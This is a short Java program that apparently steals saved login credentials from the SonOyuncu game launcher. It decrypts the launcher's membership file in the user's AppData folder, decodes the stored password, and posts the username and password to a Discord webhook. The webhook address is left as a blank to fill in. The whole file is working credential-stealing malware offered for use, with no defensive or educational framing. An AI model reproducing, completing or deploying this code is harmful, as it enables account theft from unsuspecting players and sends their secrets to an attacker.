package xyz.groax;

import com.google.common.io.BaseEncoding;
import com.google.gson.JsonObject;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.Random;

public class Main {

    public static void main(String[] args) {
        JsonObject element = Utils.decrypt(new File(System.getenv("appdata") + "\\.sonoyuncu\\sonoyuncu-membership.json")).getAsJsonObject();
        String username = element.get("sonOyuncuUsername").getAsString();
        String password = new String(BaseEncoding.base64().decode(element.get("sonOyuncuPassword").getAsString()));
        String URL = "Enter Webhook URL here.";
        WebhookUtil webhook = new WebhookUtil(URL);
        webhook.addEmbed((new WebhookUtil.EmbedObject())
                .setAuthor("rootx", "", "")
                .setColor(new Color(new Random().nextInt(0xFFFFFF)))
                .setThumbnail("https://cdn.discordapp.com/attachments/758582848604733442/766991691206623242/1f6a6f4454d463ea00f601bc7b2e9f7a.png")
                .addField("Username", username, true)
                .addField("Password", password, true)
        );
        try {
            webhook.execute();
        } catch (IOException err) {
          err.printStackTrace();
        }
    }
}
